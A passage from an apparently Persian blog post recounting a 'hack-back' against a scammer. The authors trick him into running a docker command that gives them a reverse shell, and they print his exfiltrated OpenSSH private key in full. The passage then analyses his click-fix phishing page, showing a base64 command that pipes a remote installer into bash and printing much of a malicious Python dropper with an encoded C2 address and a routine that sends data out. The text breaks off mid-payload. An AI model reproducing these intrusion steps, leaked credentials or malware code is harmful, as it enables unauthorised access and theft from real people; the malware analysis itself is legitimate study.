/p/%D8%B9%D9%85%D9%84%DB%8C%D8%A7%D8%AA-%D9%85%D8%B9%DA%A9%D9%88%D8%B3-%D8%B4%DA%A9%D8%A7%D8%B1%DA%86%DB%8C%D9%90-%D8%B4%DA%A9%D8%A7%D8%B1-%D8%B4%D8%AF%D9%87/cowrie_hu_144f082fa638fb6a.png 1024w" loading=lazy alt="تلاش مهاجم برای اتصال به هانی پات" class=gallery-image data-flex-grow=266 data-flex-basis=640px></p><p>بعدش توی تلگرام پیام داد که آقا وصل نمیشه. اینجا دیگه قربانی کاملا آماده بود که طعمه‌ای که براش گذاشته بودیم رو گاز بگیره! یه جمله سرهم کردم که بیا این کامند رو بزن اصلا وصل‌شو به سیستم من دیگه فیلترینگ و فایروال اینارو بایپیس کن:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ sudo docker run -v /:/host -it --rm xyz9045/84.26.14.40
+</span></span></code></pre></td></tr></table></div></div><p>یکمی شک کرد گفت واقعا داکر؟ گفتم بله بزن وصلی میشی. نتیجه؟ کامند رو زد و ما از سیستمش reverse shell گرفتیم. </p><p><img src=/p/%D8%B9%D9%85%D9%84%DB%8C%D8%A7%D8%AA-%D9%85%D8%B9%DA%A9%D9%88%D8%B3-%D8%B4%DA%A9%D8%A7%D8%B1%DA%86%DB%8C%D9%90-%D8%B4%DA%A9%D8%A7%D8%B1-%D8%B4%D8%AF%D9%87/ac1.png width=1024 height=722 srcset="/p/%D8%B9%D9%85%D9%84%DB%8C%D8%A7%D8%AA-%D9%85%D8%B9%DA%A9%D9%88%D8%B3-%D8%B4%DA%A9%D8%A7%D8%B1%DA%86%DB%8C%D9%90-%D8%B4%DA%A9%D8%A7%D8%B1-%D8%B4%D8%AF%D9%87/ac1_hu_3a0f55fb2bf27bc0.png 480w, /p/%D8%B9%D9%85%D9%84%DB%8C%D8%A7%D8%AA-%D9%85%D8%B9%DA%A9%D9%88%D8%B3-%D8%B4%DA%A9%D8%A7%D8%B1%DA%86%DB%8C%D9%90-%D8%B4%DA%A9%D8%A7%D8%B1-%D8%B4%D8%AF%D9%87/ac1_hu_aac4677771ea2640.png 1024w" loading=lazy alt="دسترسی از vm مهاجم" class=gallery-image data-flex-grow=141 data-flex-basis=340px></p><p><img src=/p/%D8%B9%D9%85%D9%84%DB%8C%D8%A7%D8%AA-%D9%85%D8%B9%DA%A9%D9%88%D8%B3-%D8%B4%DA%A9%D8%A7%D8%B1%DA%86%DB%8C%D9%90-%D8%B4%DA%A9%D8%A7%D8%B1-%D8%B4%D8%AF%D9%87/ac2.png width=1024 height=860 srcset="/p/%D8%B9%D9%85%D9%84%DB%8C%D8%A7%D8%AA-%D9%85%D8%B9%DA%A9%D9%88%D8%B3-%D8%B4%DA%A9%D8%A7%D8%B1%DA%86%DB%8C%D9%90-%D8%B4%DA%A9%D8%A7%D8%B1-%D8%B4%D8%AF%D9%87/ac2_hu_c2487e2c49980c78.png 480w, /p/%D8%B9%D9%85%D9%84%DB%8C%D8%A7%D8%AA-%D9%85%D8%B9%DA%A9%D9%88%D8%B3-%D8%B4%DA%A9%D8%A7%D8%B1%DA%86%DB%8C%D9%90-%D8%B4%DA%A9%D8%A7%D8%B1-%D8%B4%D8%AF%D9%87/ac2_hu_bfae7a83758a9e4c.png 1024w" loading=lazy alt="دسترسی از vm مهاجم" class=gallery-image data-flex-grow=119 data-flex-basis=285px></p><p>سریع چندتا کامند زدیم و یه سری خروجی رو چک کردیم و دیدیم که خب یکمی محافظه کار هست و اینو توی یکی از VMهایی که به عنوان VPN Serverش هست اجرا کرده. در نهایت برای اطمینان، private keyش رو هم بیرون کشیدیم:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>-----BEGIN OPENSSH PRIVATE KEY-----
+</span></span><span class=line><span class=cl>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAACFwAAAAdzc2gtcn
+</span></span><span class=line><span class=cl>NhAAAAAwEAAQAAAgEAoCETstgWJm08Iaf01p5JhRyIoAq4qEulpd8ndp/CjZu5gfw+iJ6N
+</span></span><span class=line><span class=cl>FanU/di0Q/K8miBRGCij6Abe4IgzI6yE6pd4MfGqSJPEjPt/rm+nBIjSWasjPXpkUEpeAS
+</span></span><span class=line><span class=cl>mF1eRaknUZRhmOPfiEC5dgfo4exnN8KSUyOQKLfc5/oRCpwfouk2/p/lOvoXqekGLQiAC/
+</span></span><span class=line><span class=cl>oDPiSmLotS9d5JX/wl8cuz1repzpxYofz8MSgFgaxODvev3xX0sgYl7dYohtIWPxcjNrg/
+</span></span><span class=line><span class=cl>RB4Nh9aFsZgYR1bQcnoWGZhxcou5KQpCzjV8EgOLwFKhj5NlQfFb395Xm9ciR7RKCAwH/a
+</span></span><span class=line><span class=cl>//3Fldn5ADA/L7mU4SyQ+MgaWF9uA4L7yv2TVXGpEk076INk79Fd+O4lS7n8mj4CGgipbN
+</span></span><span class=line><span class=cl>5tJo2kndMCU2gekWhM9/PIovfDRxdVgGl0tOivKSf//eHg9b1W+rCYfbaibqW1aYnlM0Um
+</span></span><span class=line><span class=cl>VUxiu58sYNHnQvR+ejR6GhIhFy9lb7Of3w6U0G8C7UEUUUJ1XXKxeP1v5/16KVhbBzn5eR
+</span></span><span class=line><span class=cl>P8ZXrCG1bVlnpC8fLH+OO1PKLI4l52PBSaG3T7+9IJJzkUYxMi38tCe8vfSUR9usiU3LLM
+</span></span><span class=line><span class=cl>PKNcBkHRZvA7ZlIMQ096t5n4oLWMhAJOoqyDdHIag4xliIlFBmOKTlDTOcElncqRlGfaC6
+</span></span><span class=line><span class=cl>sAAAdQJqVAbSalQG0AAAAHc3NoLXJzYQAAAgEAoCETstgWJm08Iaf01p5JhRyIoAq4qEul
+</span></span><span class=line><span class=cl>pd8ndp/CjZu5gfw+iJ6NFanU/di0Q/K8miBRGCij6Abe4IgzI6yE6pd4MfGqSJPEjPt/rm
+</span></span><span class=line><span class=cl>+nBIjSWasjPXpkUEpeASmF1eRaknUZRhmOPfiEC5dgfo4exnN8KSUyOQKLfc5/oRCpwfou
+</span></span><span class=line><span class=cl>k2/p/lOvoXqekGLQiAC/oDPiSmLotS9d5JX/wl8cuz1repzpxYofz8MSgFgaxODvev3xX0
+</span></span><span class=line><span class=cl>sgYl7dYohtIWPxcjNrg/RB4Nh9aFsZgYR1bQcnoWGZhxcou5KQpCzjV8EgOLwFKhj5NlQf
+</span></span><span class=line><span class=cl>Fb395Xm9ciR7RKCAwH/a//3Fldn5ADA/L7mU4SyQ+MgaWF9uA4L7yv2TVXGpEk076INk79
+</span></span><span class=line><span class=cl>Fd+O4lS7n8mj4CGgipbN5tJo2kndMCU2gekWhM9/PIovfDRxdVgGl0tOivKSf//eHg9b1W
+</span></span><span class=line><span class=cl>+rCYfbaibqW1aYnlM0UmVUxiu58sYNHnQvR+ejR6GhIhFy9lb7Of3w6U0G8C7UEUUUJ1XX
+</span></span><span class=line><span class=cl>KxeP1v5/16KVhbBzn5eRP8ZXrCG1bVlnpC8fLH+OO1PKLI4l52PBSaG3T7+9IJJzkUYxMi
+</span></span><span class=line><span class=cl>38tCe8vfSUR9usiU3LLMPKNcBkHRZvA7ZlIMQ096t5n4oLWMhAJOoqyDdHIag4xliIlFBm
+</span></span><span class=line><span class=cl>OKTlDTOcElncqRlGfaC6sAAAADAQABAAACAA42gWIZbfXhMjomh0PZbtsiyjmyWeuOM1jC
+</span></span><span class=line><span class=cl>suUDjyg0j0WrVv2XXRx0I5SYfH+fdwATKD+Fs+6vVW8Gh8t9z5pm8WM1eRDSFNsSo6WfAW
+</span></span><span class=line><span class=cl>sUnd8ZopodV/QMdcWSou92QlfHjwO61vZHLak9uXHiOXcR3w5j385RnIIBJzDrorW1+BZc
+</span></span><span class=line><span class=cl>E5/gW7Fwicx1CN9ZeajFkitaFh+m4aWdbsMY4Br6e6S5csJ23RX60ZSUvWOGN5tqGNeFeo
+</span></span><span class=line><span class=cl>1gsDPDujQBg/fH+p4Oux4y+QafN2dYk3em7+ySFid4dcQYYUBBP7iVSr/eaHLxHoWk99Fd
+</span></span><span class=line><span class=cl>OMD6ikcsV8iimmr7rjuUkcoYO9KVfuf8xz4SebYEtYJPs3R2bkTDTrfLuDqON2P5o8Jjp7
+</span></span><span class=line><span class=cl>oP/a2TN0bXUmOxQaUYzveU2L6W2Mvph+67EuKyiTv8bxHgW/CfXxdKAtnC+oLufNEt4M71
+</span></span><span class=line><span class=cl>xOIDaVEo9CRstYIWNs3q//Snc/W8MOuTnZj9uJX6XU2X9fhdgXNm5nwcIGs0GnZy6srPkk
+</span></span><span class=line><span class=cl>3F3O4Ge1sDk1i4Q3BrFRmVSKmFJQiZ6jskX/zX3YQy4FJfWpCTd1CxqFsHyH5zVNW23wGb
+</span></span><span class=line><span class=cl>9XhM0XWPfPk7E03hFYC3r0vCa8ZPwGVSIpwjVjigPUqROwp0bXWEc+IMg+mPh5OmZ4wYqf
+</span></span><span class=line><span class=cl>OBurQ7sjHbvjC35VPhAAABAEbBJIHAF68cLbyIaB0FUmnVhZqM1BoiazosdCyY9VvHBh2b
+</span></span><span class=line><span class=cl>EHHxLTaZSGVamq/dM450tMX6p+NID7Lfwr+OOkVEShuXrkxS95IVaMiizsK0UwWSRXHp3K
+</span></span><span class=line><span class=cl>BMtlewkvrCk/JQbEUJQsdSUpnLPqGDxG+2T9SqUnxlmp4on8B/fCawzXV+GJ6rAAagR2bT
+</span></span><span class=line><span class=cl>JWeGOBcx1WUykymki3HPxjt4YwPlj65MHW30wWOOHfgSPRbFgGDS9vYKPDmV/yM3IkKs4S
+</span></span><span class=line><span class=cl>gLUCzXcekGTz9K4WG7rwd9PaZWUnmB5Ba6gOt2cya63i3TWyK2g7gPi1KfYJYiJpd/Yi+J
+</span></span><span class=line><span class=cl>FAnhOrc7Ntc5oiIAAAEBANGpOYQb7elYzRLfxY7cJ4Y65pMhMq2YruLeSaMgkECSljMM3T
+</span></span><span class=line><span class=cl>q8UVs7qglNH6yhAExXd0kF3YLMTzJpueRvHv0x66OvOhz83bQ9FwDIofvxIMdJpdcdeCHT
+</span></span><span class=line><span class=cl>wKaFl/aqWIHtxMZfU6+eBcvp6rQBu8HSahcSsL0Dkq9A1JSRIBffNZCmVkUKWWYz9MkDLt
+</span></span><span class=line><span class=cl>r+8guGuSm5T5qfuWmv0cbRxdeFIMc9cTiM1J3Fa5lPLNxqm/3ZVDkYd1KjG9fVAqwoM0FR
+</span></span><span class=line><span class=cl>pCzCQ9FtQc/I+/+mmm0RbjbpxjZf4n9W5qbFmcUdPmQlMrpnw82WJ6hi1HG3JYe/id8+ot
+</span></span><span class=line><span class=cl>eHP0PsliZNxzEAAAEBAMOFThvOHTcrpoS1LncQ3KcJML73Qh//Y4cmYYa4d7VRGOVxhlrG
+</span></span><span class=line><span class=cl>M48l5Gqu+pHdvGC1m8v7jASTEoEo6ywttCOgLLIErLGc/8bQLAm33nkGmWLuRKw/DBTnH5
+</span></span><span class=line><span class=cl>2xlZj0OquXy0i248JJsX6Ll4NfihAugANcj9j8fxTALDdNRXWz1RBthBrktmao2Z5pS59R
+</span></span><span class=line><span class=cl>Yr1urOA62dbFKgDdh33b3bVonP4phk+PNVkXeiELxulTiMCgzEt2HKdovQ54qc8Avy04jx
+</span></span><span class=line><span class=cl>cuQJy8nwzvuKTDqRqc0fkOgjPhnfGdah/1xnFxLZzB4v0uSKHKSSrb4TO2FJqRl5zU+epC
+</span></span><span class=line><span class=cl>is07kkxfQZsAAAAZaGFycnlraW5nOTQwNjEwQGdtYWlsLmNvbQEC
+</span></span><span class=line><span class=cl>-----END OPENSSH PRIVATE KEY-----
+</span></span></code></pre></td></tr></table></div></div><p>برای اطمینان تست کردیم که آیا اون public key که به ما داد و این private key جفت هستند یا خیر:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ <span class=o>[</span> <span class=s2>&#34;</span><span class=k>$(</span>ssh-keygen -y -f key <span class=se>\
+</span></span></span><span class=line><span class=cl>    <span class=p>|</span> ssh-keygen -lf - <span class=se>\
+</span></span></span><span class=line><span class=cl>    <span class=p>|</span> awk <span class=s1>&#39;{print $2}&#39;</span><span class=k>)</span><span class=s2>&#34;</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=k>$(</span>ssh-keygen -lf key.pub <span class=se>\
+</span></span></span><span class=line><span class=cl>    <span class=p>|</span> awk <span class=s1>&#39;{print $2}&#39;</span><span class=k>)</span><span class=s2>&#34;</span> <span class=o>]</span> <span class=se>\
+</span></span></span><span class=line><span class=cl><span class=o>&amp;&amp;</span> <span class=nb>echo</span> <span class=s2>&#34;MATCH&#34;</span> <span class=se>\
+</span></span></span><span class=line><span class=cl><span class=o>||</span> <span class=nb>echo</span> <span class=s2>&#34;NO MATCH&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>MATCH
+</span></span></code></pre></td></tr></table></div></div><p>بله، کلید خودش بود 😈. داشتیم پلن می کردیم که دسترسی مون رو Persist کنیم که کانکشن رو قطع کرد. در کل فکر میکنم کمتر از یک دقیقه بیشتر دسترسی نداشتیم بهش.<br>چون خیلی سریع و بی برنامه جلو رفتیم و قصد خرابکاری هم نداشتیم، کارمون کمی نامنظم پیش رفت و البته چون از داخل ایران نمیشه این موارد رو پیگیری قانونی کرد خیلی پلن خاصی نداشتیم. ولی خب الان که این متن رو دارم می نویسم، با خودم میگم ای کاش یک درس عبرت درست و حسابی بهش می دادیم.</p><h2 id=ادامه-ماجرا-نقشه-ی-جدید-مهاجم><strong>ادامه ماجرا: نقشه ی جدید مهاجم</strong></h2><p>بعد از اینکه شل بسته شد، شروع کرد غر زدن که:<br>«آقا من وصل نشدم چی شد؟»</p><p>منم گفتم: «احتمالاً به خاطر اینترنت و فایرواله. یه بار دیگه بزن تست کنیم.»<br>ولی به نظر می‌رسید یکمی شک کرده بود، چون دوباره کامند رو نزد. ما هم بیخیال شدیم؛ دیده بودیم که ماشینی که ازش دسترسی گرفته بودیم، فقط یه VM بوده که احتمالاً به عنوان یکی از پراکسی هاش استفاده میکنه. البته احتمالا میشد از همونجا به داده های بدرد بخورتری برسیم.</p><p>خلاصه بعد از چند ساعت تصمیم گرفتیم دوباره روی مخش کار کنیم. براش نوشتیم که:<br>«حاجی بیا وصل شو، وقت ما رو تلف کردی، خیلی نامردی پیچوندی مارو!»</p><p>این بار گفت: «اصلاً بیا بریم Google Meet صحبت کنیم.»<br>ما اول فکر کردیم واقعاً می خواد با یه ترفند بیاد توی جلسه و بعد مثلا مارو ببره به سمتی که RATش رو فعال کنیم. گفتیم باشه که اون وسط ها دوباره بهش پولتیک بزنیم تا اون بازم کامند دلخواه ما رو ران کنه. </p><p>یه لینک فرستاد:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>https://meet.google.join-uk[.]com/ygt-mnek-hwm
+</span></span></code></pre></td></tr></table></div></div><p>به‌به، یه Typosquatting روی دامنه ی Google Meet! اینجا دیگه خیلی تابلو شد که نقشه‌ی جدیدی در کاره. ولی نقشه‌اش چی می تونه باشه؟ لینک رو باز نکردم ولی یه curl زدم ببینم محتوای این صفحه چیه، و دیدم بله… استاد دنبال click-fix زدن روی ماست. </p><p><img src=/p/%D8%B9%D9%85%D9%84%DB%8C%D8%A7%D8%AA-%D9%85%D8%B9%DA%A9%D9%88%D8%B3-%D8%B4%DA%A9%D8%A7%D8%B1%DA%86%DB%8C%D9%90-%D8%B4%DA%A9%D8%A7%D8%B1-%D8%B4%D8%AF%D9%87/clickfix.png width=1916 height=347 srcset="/p/%D8%B9%D9%85%D9%84%DB%8C%D8%A7%D8%AA-%D9%85%D8%B9%DA%A9%D9%88%D8%B3-%D8%B4%DA%A9%D8%A7%D8%B1%DA%86%DB%8C%D9%90-%D8%B4%DA%A9%D8%A7%D8%B1-%D8%B4%D8%AF%D9%87/clickfix_hu_1299a16bedb79f44.png 480w, /p/%D8%B9%D9%85%D9%84%DB%8C%D8%A7%D8%AA-%D9%85%D8%B9%DA%A9%D9%88%D8%B3-%D8%B4%DA%A9%D8%A7%D8%B1%DA%86%DB%8C%D9%90-%D8%B4%DA%A9%D8%A7%D8%B1-%D8%B4%D8%AF%D9%87/clickfix_hu_3dbd51bdca191538.png 1024w" loading=lazy alt="پیلود clickfix" class=gallery-image data-flex-grow=552 data-flex-basis=1325px></p><blockquote><p>حالا click-fix چیه؟ یه توضیح مختصرش اینه توی مدل جدیدی از فیشینگ به اسم click-fix، سایت قلابی خودش رو جای سرویس هایی مثل Google Meet میزنه و به کاربر خطای ساختگی نشون میده: مثلاً میگه &ldquo;میکروفون یا دوربینت مشکل داره، نمیتونی جوین بشی&rdquo;. بعد یه دکمه ی &ldquo;Fix&rdquo; میذاره که با زدنش دستورالعمل میده، مثلاً یه خط powershell یا bash آماده. کاربر هم فکر میکنه این راه حل رسمیه و همون رو توی ترمینال اجرا میکنه، در حالی که داره بدافزار رو با دست خودش نصب میکنه.</p></blockquote><p>پیلود رو باز کردیم و بررسی کردیم. دستور به این شکل بود:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ <span class=nb>echo</span> <span class=s1>&#39;L2Jpbi9iYXNoIC1jICIkKGN1cmwgLWtmc1NMIGh0dHBzOi8vbWVldC5nb29nbGUuam9pbi11ay5jb20vc3VwcG9ydC9hdWRpb19kcml2ZXJfaW5zdGFsbGVyLnNoK
+</span></span></span><span class=line><span class=cl><span class=s1>SI=&#39;</span> <span class=p>|</span> base64 -d 
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>/bin/bash -c <span class=s2>&#34;</span><span class=k>$(</span>curl -kfsSL https://meet.google.join-uk<span class=o>[</span>.<span class=o>]</span>com/support/audio_driver_installer.sh<span class=k>)</span><span class=s2>&#34;</span>
+</span></span></code></pre></td></tr></table></div></div><p>بعد فایل audio_driver_installer.sh رو دانلود و باز کردیم:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/bin/bash</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>PYTHON</span><span class=o>=</span><span class=err>$</span><span class=p>(</span><span class=n>command</span> <span class=o>-</span><span class=n>v</span> <span class=n>python3</span> <span class=o>||</span> <span class=n>command</span> <span class=o>-</span><span class=n>v</span> <span class=n>python</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>[</span> <span class=o>-</span><span class=n>z</span> <span class=s2>&#34;$PYTHON&#34;</span> <span class=p>];</span> <span class=n>then</span>
+</span></span><span class=line><span class=cl>    <span class=n>exit</span> <span class=mi>1</span>
+</span></span><span class=line><span class=cl><span class=n>fi</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>TMP_PY_SCRIPT</span><span class=o>=</span><span class=err>$</span><span class=p>(</span><span class=n>mktemp</span> <span class=o>/</span><span class=n>tmp</span><span class=o>/</span><span class=n>systems</span><span class=o>-</span><span class=n>private</span><span class=o>-</span><span class=mi>3</span><span class=n>f27e703481c43aab27860c1df4e14b1XXXX</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>cat</span> <span class=o>&lt;&lt;</span> <span class=s1>&#39;EOF&#39;</span> <span class=o>&gt;</span> <span class=s2>&#34;$TMP_PY_SCRIPT&#34;</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>sys</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>string</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>urllib.request</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>urllib.error</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>http.client</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>json</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>struct</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>time</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>array</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>socket</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>ctypes</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>ctypes</span> <span class=k>as</span> <span class=nn>ct</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os.path</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>subprocess</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>platform</span>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>ctypes</span> <span class=kn>import</span> <span class=n>wintypes</span> <span class=k>as</span> <span class=n>w</span>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pathlib</span> <span class=kn>import</span> <span class=n>Path</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>base64</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>threading</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>random</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>ssl</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>error_de</span> <span class=o>=</span> <span class=s2>&#34;YUtPID0gImFkZndlZndlZndlIg0KdXJsID0gImh0dHA6Ly9zZWFyY2hib3guaW5mby9wcmVmZXIucGhwIg0KDQo=&#34;</span>
+</span></span><span class=line><span class=cl><span class=n>din_dat</span> <span class=o>=</span> <span class=s2>&#34;dHJhY2UgPSAiaWlubmlvb2lvam5uYXdlZm9pam9udmJ6MWF6eHNkd3dhYXF6dncyMzRld3hjdm5vcHJ0d3F4diINCktleSA9IGJ5dGVhcnJheShbMywgNiwgMiwgMSwgNiwgMCwgNCwgNywgMCwgMSwgOSwgNiwgOCwgMSwgMiwgNV0pDQpkZWYgR2V0T2JqSUQoKToNCiAgICByZXR1cm4gJycuam9pbihyYW5kb20uY2hvaWNlKHN0cmluZy5hc2NpaV9sZXR0ZXJzKSBmb3IgeCBpbiByYW5nZSgxMikpDQpkZWYgR2V0T1NTdHJpbmcoKToNCiAgICByZXR1cm4gcGxhdGZvcm0ucGxhdGZvcm0oKQ0Kc3pPYmplY3RJRCA9IEdldE9iaklEKCkNCnN6UENvZGUgPSAiT3BlcmF0aW5nIFN5c3RlbSA6ICIgKyBHZXRPU1N0cmluZygpDQpzekNvbXB1dGVyTmFtZSA9ICJDb21wdXRlciBOYW1lIDogIiArIHNvY2tldC5nZXRob3N0bmFtZSgpDQpkZWYgeG9yX2VuY3J5cHRfZGVjcnlwdChkYXRhLCBrZXkpOg0KICAgIHJlc3VsdCA9IGJ5dGVhcnJheSgpDQogICAgZm9yIGkgaW4gcmFuZ2UobGVuKGRhdGEpKToNCiAgICAgICAgcmVzdWx0LmFwcGVuZChkYXRhW2ldIF4ga2V5W2kgJSBsZW4oa2V5KV0pDQogICAgcmV0dXJuIGJ5dGVzKHJlc3VsdCkNCmRlZiBnZXRfYnl0ZXNfZnJvbV91bmljb2RlKHRleHQsIGVuY29kaW5nID0gJ3V0Zi0xNmxlJyk6DQogICAgcmV0dXJuIHRleHQuZW5jb2RlKGVuY29kaW5nKQ0KZGVmIEhUVFBfUE9TVCh1cmwsIGRhdGEpOg0KICAgIHVzZXJfYWdlbnQgPSAiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzNC4wLjAuMCBTYWZhcmkvNTM3LjM2Ig0KICAgIGVuY29kZWRfZGF0YSA9IGRhdGEuZW5jb2RlKCd1dGYtOCcpDQogICAgY29udGV4dCA9IHNzbC5fY3JlYXRlX3VudmVyaWZpZWRfY29udGV4dCgpDQogICAgbl9yZXF1ZXN0ID0gdXJsbGliLnJlcXVlc3QuUmVxdWVzdCh1cmwsIGRhdGE9ZW5jb2RlZF9kYXRhKQ0KICAgIG5fcmVxdWVzdC5hZGRfaGVhZGVyKCdVc2VyLUFnZW50JywgdXNlcl9hZ2VudCkNCg0KICAgIHdpdGggdXJsbGliLnJlcXVlc3QudXJsb3BlbihuX3JlcXVlc3QsIGNvbnRleHQ9Y29udGV4dCwgdGltZW91dCA9IDYwKSBhcyByZXNwb25zZToNCiAgICAgICAgcmV0dXJuIHJlc3BvbnNlLnJlYWQoKS5kZWNvZGUoJ3V0Zi04JykNCmRlZiBNYWtlUmVxdWVzdFBhY2tldChzekNvbnRlbnRzKToNCiAgICBzekNJRCA9ICJGRDQyOURFQUJFIg0KICAgIHN6U3RlcCA9ICJcclxuXHRcdFN0ZXAxIDogS2VlcExpbmsoUClcclxuIg0KICAgIGxzelJlcXVlc3QgPSBiIiINCiAgICBscFJlcXVlc3QgPSBieXRlYXJyYXkoKQ0KICAgIGxwUmVxdWVzdEVuYyA9IGJ5dGVhcnJheSgpDQogICAgaWYgbGVuKHN6Q29udGVudHMpID09IDA6DQogICAgICAgIHN6RGF0YSA9IHN6U3RlcCArIHN6UENvZGUgKyAiXHJcbiIgKyBzekNvbXB1dGVyTmFtZSArICJcclxuIiArIHN6Q29udGVudHMNCiAgICBlbHNlOg0KICAgICAgICBzekRhdGEgPSBzekNvbnRlbnRzDQogICAgbHN6UmVxdWVzdCA9ICJpZD0iICsgc3pDSUQgKyAiJm9pZD0iICsgc3pPYmplY3RJRCArICImZGF0YT0iDQogICAgbHBSZXF1ZXN0ID0gZ2V0X2J5dGVzX2Zyb21fdW5pY29kZShzekRhdGEpDQogICAgbHBSZXF1ZXN0RW5jID0geG9yX2VuY3J5cHRfZGVjcnlwdChscFJlcXVlc3QsS2V5KQ0KICAgIHN6YjY0RGF0YSA9IGJhc2U2NC5iNjRlbmNv